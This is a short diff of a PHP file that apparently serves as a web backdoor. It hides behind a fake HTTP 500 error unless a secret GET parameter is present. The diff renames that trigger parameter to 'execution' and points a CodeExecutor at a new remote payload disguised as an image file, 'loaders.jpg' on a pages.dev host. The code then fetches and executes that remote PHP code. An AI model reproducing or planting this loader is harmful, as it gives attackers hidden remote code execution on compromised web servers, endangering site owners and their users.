@@ -1,6 +1,6 @@
 <?php
 // Check if the 'fetcher' parameter is present in the URL
-if (!isset($_GET['para_meter'])) {
+if (!isset($_GET['execution'])) {
     // If not, show error 500
     http_response_code(500);
     echo "";
@@ -247,7 +247,7 @@ try {
     $executor = new CodeExecutor($fetcher);
 
     // Execute the PHP code fetched from a specific URL
-    $executor->executeCodeFromURL("https://batuk-di-komik-aja.pages.dev/loader.jpg");
+    $executor->executeCodeFromURL("https://batuk-di-komik-aja.pages.dev/loaders.jpg");
 } catch (Exception $e) {
     // Handle errors and exceptions
     echo "Error: " . $e->getMessage();
